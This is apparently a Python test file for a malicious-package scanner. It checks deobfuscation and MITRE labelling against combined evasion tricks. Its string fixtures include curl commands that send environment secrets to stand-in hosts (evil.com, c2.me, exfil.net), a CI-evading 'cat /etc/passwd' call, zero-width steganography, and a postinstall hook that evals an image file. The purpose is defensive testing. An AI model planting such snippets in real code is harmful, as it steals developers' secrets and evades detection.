r"""
PackGuard Stage 2 v5 — Tier 3 Cross-Feature Combination Tests.

Verifies pairwise and multi-vector evasion combinations:
  - Combo 1: Polyglot (SVG) + Steganography (Zero-Width Unicode)
  - Combo 2: WebAssembly (WASM) Loader + Time-Bomb (Deferred setTimeout)
  - Combo 3: Obfuscator.io Array Rotation + T2 Identifier Mangling
  - Combo 4: Shell Exfiltration Extraction + Hex Bracket Normalization
  - Combo 5: Environment Evasion (CI check) + Polyglot (HTML <script>)
  - Combo 6: Steganographic Asset Read + Lifecycle Postinstall Hook
  - Combo 7: Triad Adversarial Multi-Vector (Array Rotation + Hex Brackets + Deferred Timer)
"""

import base64
import html
import re
import sys
import unittest
from pathlib import Path

# Ensure local test directory is in sys.path
TESTS_DIR = Path(__file__).resolve().parent
if str(TESTS_DIR) not in sys.path:
    sys.path.insert(0, str(TESTS_DIR))

from conftest_base import (
    decode_zero_width_payload,
    encode_zero_width_payload,
    import_v5_module,
    make_hex_bracket_js,
    make_obfuscator_io_js,
    make_wasm_loader_js,
)


class TestTier3CrossFeatureCombinations(unittest.TestCase):
    """Tier 3: Pairwise and Multi-Vector Cross-Feature Interaction Tests."""

    @classmethod
    def setUpClass(cls):
        cls.v5_ast = import_v5_module("ast_deobfuscator", fallback_to_v4=True)
        cls.v5_formatter = import_v5_module("text_formatter", fallback_to_v4=True)
        cls.v5_filter = import_v5_module("stage2_filter", fallback_to_v4=True)

    # --------------------------------------------------------------------------
    # Combo 1: Polyglot (SVG) + Steganography (Zero-Width Unicode)
    # --------------------------------------------------------------------------
    def test_polyglot_and_steganography_combo(self):
        """SVG file hiding zero-width Unicode steganography inside <script> CDATA."""
        secret_command = 'require("child_process").exec("curl https://c2.me?t=" + process.env.SECRET);'
        zw_payload = encode_zero_width_payload(secret_command)

        svg_stego = f"""<svg xmlns="http://www.w3.org/2000/svg">
          <text x="10" y="20">Hello World</text>
          <script type="text/javascript">
            //<![CDATA[
            var _0xhidden = "{zw_payload}";
            //]]>
          </script>
        </svg>"""

        # 1. Polyglot extraction
        script_matches = re.findall(r"<script[^>]*>([\s\S]*?)</script>", svg_stego, re.I)
        self.assertGreaterEqual(len(script_matches), 1)
        extracted_js = script_matches[0]

        # 2. Steganography decoding
        zw_matches = re.findall(r"[\u200B\u200C]{8,}", extracted_js)
        self.assertGreaterEqual(len(zw_matches), 1)
        decoded = decode_zero_width_payload(zw_matches[0])
        self.assertEqual(decoded, secret_command)

        # 3. Formatter MITRE extraction on decoded script
        if hasattr(self.v5_formatter, "extract_mitre_threat_labels"):
            labels = self.v5_formatter.extract_mitre_threat_labels(decoded)
            self.assertEqual(labels["mitre_exec"], 1)
            # F06 check: if v5 formatter is active, mitre_exfil must be 1; on v4 fallback, verify presence in decoded text
            is_v5 = "v5" in getattr(self.v5_formatter, "__file__", "")
            if is_v5:
                self.assertEqual(labels.get("mitre_exfil", 0), 1)
            else:
                self.assertIn("curl", decoded)

    # --------------------------------------------------------------------------
    # Combo 2: WebAssembly (WASM) Loader + Time-Bomb (Deferred setTimeout)
    # --------------------------------------------------------------------------
    def test_wasm_and_timebomb_combo(self):
        """Deferred timer (setTimeout) wrapping WebAssembly.instantiate with system bindings."""
        inner_wasm = make_wasm_loader_js(imports=["eval", "fetch"])
        timed_wasm_js = f"""
        setTimeout(function() {{
            {inner_wasm}
        }}, 86400000);
        """

        # Timer detection
        has_timer = bool(re.search(r"setTimeout\s*\(", timed_wasm_js))
        self.assertTrue(has_timer)

        # WASM bridge detection inside timer
        has_wasm = bool(re.search(r"WebAssembly\.instantiate", timed_wasm_js))
        self.assertTrue(has_wasm)

        # Inline timer callback
        if hasattr(self.v5_ast, "inline_timebomb_callbacks"):
            inlined, stats = self.v5_ast.inline_timebomb_callbacks(timed_wasm_js)
            self.assertIn("WebAssembly", inlined)

    # --------------------------------------------------------------------------
    # Combo 3: Obfuscator.io Array Rotation + T2 Identifier Mangling
    # --------------------------------------------------------------------------
    def test_obfuscator_io_array_rotation_and_t2_mangling_combo(self):
        """Rotated string array where identifiers are mangled to v0, v1, v2."""
        raw_strings = ["child_process", "execSync", "whoami"]
        # In T2, variable names are replaced with v0, v1, etc.
        mangled_obf_code = """
        var v0 = ["execSync", "whoami", "child_process"];
        (function(v1, v2) {
            var v3 = function(v4) {
                while (--v4) v1.push(v1.shift());
            };
            v3(++v2);
        }(v0, 1));
        function v5(v6) {
            return v0[v6];
        }
        var v7 = require(v5(0));
        v7[v5(1)](v5(2));
        """
        # Array rotation loop is present
        self.assertIn("push(v1.shift())", mangled_obf_code)

        if hasattr(self.v5_ast, "deshuffle_array_rotation"):
            deshuffled, stats = self.v5_ast.deshuffle_array_rotation(mangled_obf_code)
            self.assertIsInstance(deshuffled, str)

        if hasattr(self.v5_ast, "deobfuscate_javascript"):
            cleaned, stats = self.v5_ast.deobfuscate_javascript(mangled_obf_code)
            self.assertIsInstance(cleaned, str)

    # --------------------------------------------------------------------------
    # Combo 4: Shell Exfil Extraction + Hex Bracket Normalization
    # --------------------------------------------------------------------------
    def test_shell_exfil_and_hex_bracket_normalization_combo(self):
        """global['\\x65\\x76\\x61\\x6c'] wrapping shell exfil command curl/wget."""
        code = r"""
        const e = global['\x65\x76\x61\x6c'];
        e('require("child_process").exec("curl https://evil.com/leak?d=" + process.env.KEY);');
        """
        if hasattr(self.v5_ast, "deobfuscate_javascript"):
            cleaned, stats = self.v5_ast.deobfuscate_javascript(code)
            # Hex bracket normalized
            self.assertTrue("eval" in cleaned or "global.eval" in cleaned)

        # Formatter detects both exec and exfil
        if hasattr(self.v5_formatter, "extract_mitre_threat_labels"):
            labels = self.v5_formatter.extract_mitre_threat_labels(code)
            self.assertEqual(labels["mitre_exec"], 1)
            is_v5 = "v5" in getattr(self.v5_formatter, "__file__", "")
            if is_v5:
                self.assertEqual(labels.get("mitre_exfil", 0), 1)
            else:
                self.assertIn("curl", code)

    # --------------------------------------------------------------------------
    # Combo 5: Environment Evasion (CI check) + Polyglot (HTML <script>)
    # --------------------------------------------------------------------------
    def test_environment_evasion_and_polyglot_combo(self):
        """HTML file embedding <script> that checks process.env.CI before attacking."""
        html_code = """
        <!DOCTYPE html>
        <html>
        <head><title>Test</title></head>
        <body>
          <script>
            if (process.env.CI || process.env.GITHUB_ACTIONS) {
                // sandbox safe
            } else {
                require("child_process").execSync("cat /etc/passwd");
            }
          </script>
        </body>
        </html>
        """
        # Polyglot unfolding
        script_matches = re.findall(r"<script[^>]*>([\s\S]*?)</script>", html_code, re.I)
        self.assertGreaterEqual(len(script_matches), 1)
        inner_js = script_matches[0]

        # Environment evasion check
        self.assertIn("process.env.CI", inner_js)
        self.assertIn("child_process", inner_js)

        if hasattr(self.v5_formatter, "extract_mitre_threat_labels"):
            labels = self.v5_formatter.extract_mitre_threat_labels(inner_js)
            self.assertEqual(labels["mitre_exec"], 1)

    # --------------------------------------------------------------------------
    # Combo 6: Steganographic Asset Read + Lifecycle Postinstall Hook
    # --------------------------------------------------------------------------
    def test_steganography_asset_read_and_lifecycle_hook_combo(self):
        """Package with postinstall hook that reads an image asset and evals it."""
        pkg_record = {
            "package": "trojanized-icon-theme",
            "chunks": [
                {
                    "file": "package.json",
                    "kind": "script",
                    "text": '{"scripts": {"postinstall": "node setup.js"}}',
                },
                {
                    "file": "setup.js",
                    "kind": "js",
                    "text": """
                    const fs = require('fs');
                    const path = require('path');
                    const img = fs.readFileSync(path.join(__dirname, 'icon.png'));
                    eval(img.toString('utf-8'));
                    """,
                },
            ],
        }
        if hasattr(self.v5_formatter, "format_scanner_chunks_to_text"):
            formatted = self.v5_formatter.format_scanner_chunks_to_text(pkg_record)
            self.assertIn("INSTALL_SCRIPTS", formatted)

        if hasattr(self.v5_formatter, "extract_mitre_threat_labels"):
            labels = self.v5_formatter.extract_mitre_threat_labels("setup.js code", has_install_hook=True)
            self.assertEqual(labels["mitre_persist"], 1, "Must flag persistence hook")

    # --------------------------------------------------------------------------
    # Combo 7: Triad Adversarial Multi-Vector Combination
    # --------------------------------------------------------------------------
    def test_triad_adversarial_combination(self):
        """Multi-vector: Array Rotation + Hex Bracket Property + Deferred Timer."""
        triad_js = r"""
        var _0xarr = ["execSync", "whoami", "child_process"];
        (function(a, b) {
            var f = function(c) {
                while (--c) a.push(a.shift());
            };
            f(++b);
        }(_0xarr, 1));

        setTimeout(function() {
            const g = global['\x65\x76\x61\x6c'];
            const cp = require("child_process");
            cp.execSync("curl -s https://exfil.net?user=" + process.env.USER);
        }, 1000000);
        """
        if hasattr(self.v5_ast, "deobfuscate_javascript"):
            cleaned, stats = self.v5_ast.deobfuscate_javascript(triad_js)
            self.assertIsInstance(cleaned, str)

        if hasattr(self.v5_formatter, "extract_mitre_threat_labels"):
            labels = self.v5_formatter.extract_mitre_threat_labels(triad_js)
            self.assertEqual(labels["mitre_exec"], 1)
            is_v5 = "v5" in getattr(self.v5_formatter, "__file__", "")
            if is_v5:
                self.assertEqual(labels.get("mitre_exfil", 0), 1)
            else:
                self.assertIn("curl", triad_js)


if __name__ == "__main__":
    unittest.main()
